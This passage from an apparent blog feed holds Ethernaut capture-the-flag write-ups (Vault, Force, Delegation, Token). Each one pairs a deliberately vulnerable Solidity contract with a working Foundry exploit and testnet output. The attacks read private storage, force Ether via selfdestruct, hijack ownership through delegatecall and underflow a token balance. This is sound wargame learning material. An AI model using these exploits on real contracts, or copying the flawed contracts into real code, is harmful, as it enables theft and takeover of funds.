--broadcast[‚†ä] Compiling...[‚†∞] Compiling 1 files with Solc 0.8.29[‚†í] Solc 0.8.29 finished in 322.36msCompiler run successful!Script ran successfully.## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.00101144 gweiEstimated total gas used for script: 36108Estimated amount required: 0.00000003652107552 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x14d0aaca36fb737a61c0a533652da5a4d2314117698a64a1788ec28633d7f1b1Block: 3685538Paid: 0.000000026441866776 ETH (26143 gas * 0.001011432 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000026441866776 ETH (26143 gas * avg 0.001011432 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Unlock the vault</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Vault</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">locked</span><span class=\"p\">;</span>    <span class=\"kt\">bytes32</span> <span class=\"k\">private</span> <span class=\"n\">password</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">_password</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>        <span class=\"n\">password</span> <span class=\"o\">=</span> <span class=\"n\">_password</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">_password</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">password</span> <span class=\"o\">==</span> <span class=\"n\">_password</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Because the blockchain is transparent, secret keys cannot be stored on it.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>cast storage 0x65E998C6f70c90f149553c967BA4a38Ecc6213A9 10x412076657279207374726f6e67207365637265742070617373776f7264203a29</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-19-Vault/cyberchef.png\" alt=\"Image cyberchef\" /></p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Vault.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">ValutSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Vault</span> <span class=\"k\">public</span> <span class=\"n\">vault_</span> <span class=\"o\">=</span> <span class=\"n\">Vault</span><span class=\"p\">(</span><span class=\"mh\">0x65E998C6f70c90f149553c967BA4a38Ecc6213A9</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">vault_</span><span class=\"p\">.</span><span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"mh\">0x412076657279207374726f6e67207365637265742070617373776f7264203a29</span><span class=\"p\">);</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/VaultSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†∞] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>‚†í] Solc 0.8.29 finished <span class=\"k\">in </span>322.36msCompiler run successful!Script ran successfully.<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.00101144 gweiEstimated total gas used <span class=\"k\">for </span>script: 36108Estimated amount required: 0.00000003652107552 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x14d0aaca36fb737a61c0a533652da5a4d2314117698a64a1788ec28633d7f1b1Block: 3685538Paid: 0.000000026441866776 ETH <span class=\"o\">(</span>26143 gas <span class=\"k\">*</span> 0.001011432 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000026441866776 ETH (26143 gas * avg 0.001011432 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-19-Vault/locked.png\" alt=\"Image locked\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-19-Vault/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/19/vault",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-19T00:00:00+09:00",
            "date_modified": "2025-04-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/19/force",
            "title": "[Ethernaut] Force",
            "summary": null,
            "content_text": "AnalysisThe goal is  make the balance of the contract greater than zero// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Force { /*                   MEOW ?         /\\_/\\   /    ____/ o o \\    /~____  =√∏= /    (______)__m_m)                   */ }Solidity 0.8.30 Documentation - sending and receiving ether  üí° Neither contracts nor ‚Äúexternal accounts‚Äù are currently able to prevent someone from sending them Ether. Contracts can react on and reject a regular transfer, but there are ways to move Ether without creating a message call. One way is to simply ‚Äúmine to‚Äù the contract address and the second way is using¬†selfdestruct(x).Solidity 0.8.30 Documentation - deactivate and self destructThe selfdestruct() function removes code from blockchain.It move Ether stored in the contract to a specified address without creating a message call.Even if a contract‚Äôs code does not contain a call to selfdestruct, it can still perform that operation using delegatecall or callcode.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Force.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(address payable force_) payable {        selfdestruct(force_);    }}contract ForceSol is Script {    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        new Ex{value: 1 wei}(payable(0xD38Cdc747b3Fdc5B553ec592a89b92db3015c2e6));        vm.stopBroadcast();    }}$ forge script script/ForceSol.sol --broadcast --tc ForceSol[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001062799 gweiEstimated total gas used for script: 83584Estimated amount required: 0.000000088832991616 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xfe8f4a467eb59cc75d1969cbcb0338d23b568d91028e387bba6bcebb5c605526Contract Address: 0xfF2baB3F127feb02B77A4dBd869b25f63d442b79Block: 3677667Paid: 0.000000068333210136 ETH (64296 gas * 0.001062791 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000068333210136 ETH (64296 gas * avg 0.001062791 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>make the balance of the contract greater than zero</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Force</span> <span class=\"p\">{</span> <span class=\"cm\">/*                   MEOW ?         /\\_/\\   /    ____/ o o \\    /~____  =√∏= /    (______)__m_m)                   */</span> <span class=\"p\">}</span></code></pre></div></div><p><a href=\"https://docs.soliditylang.org/en/latest/security-considerations.html#sending-and-receiving-ether\">Solidity 0.8.30 Documentation - sending and receiving ether</a></p><blockquote>  <p>üí° Neither contracts nor ‚Äúexternal accounts‚Äù are currently able to prevent someone from sending them Ether. Contracts can react on and reject a regular transfer, but there are ways to move Ether without creating a message call. One way is to simply ‚Äúmine to‚Äù the contract address and the second way is using¬†<code class=\"language-plaintext highlighter-rouge\">selfdestruct(x)</code>.</p></blockquote><p><a href=\"https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#deactivate-and-self-destruct\">Solidity 0.8.30 Documentation - deactivate and self destruct</a></p><p>The <code class=\"language-plaintext highlighter-rouge\">selfdestruct()</code> function removes code from blockchain.</p><p>It move Ether stored in the contract to a specified address without creating a message call.</p><p>Even if a contract‚Äôs code does not contain a call to selfdestruct, it can still perform that operation using delegatecall or callcode.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Force.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"n\">force_</span><span class=\"p\">)</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">selfdestruct</span><span class=\"p\">(</span><span class=\"n\">force_</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">ForceSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0xD38Cdc747b3Fdc5B553ec592a89b92db3015c2e6</span><span class=\"p\">));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/ForceSol.sol <span class=\"nt\">--broadcast</span> <span class=\"nt\">--tc</span> ForceSol<span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001062799 gweiEstimated total gas used <span class=\"k\">for </span>script: 83584Estimated amount required: 0.000000088832991616 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xfe8f4a467eb59cc75d1969cbcb0338d23b568d91028e387bba6bcebb5c605526Contract Address: 0xfF2baB3F127feb02B77A4dBd869b25f63d442b79Block: 3677667Paid: 0.000000068333210136 ETH <span class=\"o\">(</span>64296 gas <span class=\"k\">*</span> 0.001062791 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000068333210136 ETH (64296 gas * avg 0.001062791 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-19-Force/getbalance.png\" alt=\"Image getbalance\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-19-Force/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/19/force",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","selfdestruct"],
            
            "date_published": "2025-04-19T00:00:00+09:00",
            "date_modified": "2025-04-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/19/delegation",
            "title": "[Ethernaut] Delegation",
            "summary": null,
            "content_text": "AnalysisThe goal is  claim ownership// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate {    address public owner;    constructor(address _owner) {        owner = _owner;    }    function pwn() public {        owner = msg.sender;    }}contract Delegation {    address public owner;    Delegate delegate;    constructor(address _delegateAddress) {        delegate = Delegate(_delegateAddress);        owner = msg.sender;    }    fallback() external {        (bool result,) = address(delegate).delegatecall(msg.data);        if (result) {            this;        }    }}The fallback() function in the Delegation contract performs delegatecall() to the Delegate contract.The Delegation contract‚Äôs state can be changed by caliing the pwn() function in Delegate contract via delegatecall().msg.sender in the Delegate contract will be EOA because the call is made by using delegatecall().Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Delegation.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract DelegationSol is Script {    Delegation public delegation_ = Delegation(0x604BD638031054664E87618f46871c5423E9cbFF);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        address(delegation_).call(abi.encodeWithSignature(\"pwn()\"));        console.log(\"owner: \", delegation_.owner());        vm.stopBroadcast();    }}$ forge script script/DelegationSol.sol --broadcast[‚†ä] Compiling...[‚†∞] Compiling 1 files with Solc 0.8.29[‚†î] Solc 0.8.29 finished in 280.67msCompiler run successful with warnings:Warning (9302): Return value of low-level calls not used.  --&gt; script/DelegationSol.sol:14:9:   |14 |         address(delegation_).call(abi.encodeWithSignature(\"pwn()\"));   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.== Logs ==  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001000019 gweiEstimated total gas used for script: 43100Estimated amount required: 0.0000000431008189 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xd749896a13ac87778efd535f37a37c59d6b88fedeb517b326aa83c0af160e8fdBlock: 3677303Paid: 0.000000031204249632 ETH (31204 gas * 0.001000008 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000031204249632 ETH (31204 gas * avg 0.001000008 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>claim ownership</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Delegate</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">pwn</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Delegation</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"n\">Delegate</span> <span class=\"n\">delegate</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_delegateAddress</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">delegate</span> <span class=\"o\">=</span> <span class=\"n\">Delegate</span><span class=\"p\">(</span><span class=\"n\">_delegateAddress</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">fallback</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">delegate</span><span class=\"p\">).</span><span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">);</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">this</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The <code class=\"language-plaintext highlighter-rouge\">fallback()</code> function in the Delegation contract performs <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code> to the Delegate contract.</p><p>The Delegation contract‚Äôs state can be changed by caliing the <code class=\"language-plaintext highlighter-rouge\">pwn()</code> function in Delegate contract via <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code>.</p><p><code class=\"language-plaintext highlighter-rouge\">msg.sender</code> in the Delegate contract will be EOA because the call is made by using <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code>.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Delegation.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">DelegationSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Delegation</span> <span class=\"k\">public</span> <span class=\"n\">delegation_</span> <span class=\"o\">=</span> <span class=\"n\">Delegation</span><span class=\"p\">(</span><span class=\"mh\">0x604BD638031054664E87618f46871c5423E9cbFF</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">delegation_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"pwn()\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"owner: \"</span><span class=\"p\">,</span> <span class=\"n\">delegation_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/DelegationSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†∞] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>‚†î] Solc 0.8.29 finished <span class=\"k\">in </span>280.67msCompiler run successful with warnings:Warning <span class=\"o\">(</span>9302<span class=\"o\">)</span>: Return value of low-level calls not used.  <span class=\"nt\">--</span><span class=\"o\">&gt;</span> script/DelegationSol.sol:14:9:   |14 |         address<span class=\"o\">(</span>delegation_<span class=\"o\">)</span>.call<span class=\"o\">(</span>abi.encodeWithSignature<span class=\"o\">(</span><span class=\"s2\">\"pwn()\"</span><span class=\"o\">))</span><span class=\"p\">;</span>   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001000019 gweiEstimated total gas used <span class=\"k\">for </span>script: 43100Estimated amount required: 0.0000000431008189 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xd749896a13ac87778efd535f37a37c59d6b88fedeb517b326aa83c0af160e8fdBlock: 3677303Paid: 0.000000031204249632 ETH <span class=\"o\">(</span>31204 gas <span class=\"k\">*</span> 0.001000008 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000031204249632 ETH (31204 gas * avg 0.001000008 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Delegation/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/19/delegation",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","delegatecall"],
            
            "date_published": "2025-04-19T00:00:00+09:00",
            "date_modified": "2025-04-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/18/token",
            "title": "[Ethernaut] Token",
            "summary": null,
            "content_text": "AnalysisThe goal is  hands on any additional tokens.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token {    mapping(address =&gt; uint256) balances;    uint256 public totalSupply;    constructor(uint256 _initialSupply) public {        balances[msg.sender] = totalSupply = _initialSupply;    }    function transfer(address _to, uint256 _value) public returns (bool) {        require(balances[msg.sender] - _value &gt;= 0);        balances[msg.sender] -= _value;        balances[_to] += _value;        return true;    }    function balanceOf(address _owner) public view returns (uint256 balance) {        return balances[_owner];    }}Overflow can occur in Solidity versions under 0.8.0.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"../src/Token.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract TokenSol is Script {    Token public token_ = Token(0xc5176701831Dcf084be5f95617605D2107d97182);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"balance: \", token_.balanceOf(vm.envAddress(\"MY_ADDRESS\")));        token_.transfer(address(0), 21);        console.log(\"balance: \", token_.balanceOf(vm.envAddress(\"MY_ADDRESS\")));        vm.stopBroadcast();    }}$ forge script script/TokenSol.sol --broadcast[‚†ä] Compiling...[‚†í] Compiling 1 files with Solc 0.6.12[‚†ë] Solc 0.6.12 finished in 497.00msCompiler run successful!Script ran successfully.== Logs ==  balance:  20  balance:  115792089237316195423570985008687907853269984665640564039457584007913129639935## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001000007 gweiEstimated total gas used for script: 67542Estimated amount required: 0.000000067542472794 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x6b9a4361bf15dc0a907240c72dd64d9c5cfbffafd2bbfd0197ad7dd053aa115eBlock: 3677316Paid: 0.0000000489 ETH (48900 gas * 0.001 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.0000000489 ETH (48900 gas * avg 0.001 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>hands on any additional tokens.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Token</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"n\">balances</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">totalSupply</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_initialSupply</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">totalSupply</span> <span class=\"o\">=</span> <span class=\"n\">_initialSupply</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_value</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-</span> <span class=\"n\">_value</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-=</span> <span class=\"n\">_value</span><span class=\"p\">;</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_to</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">_value</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"nb\">balance</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">balances</span><span 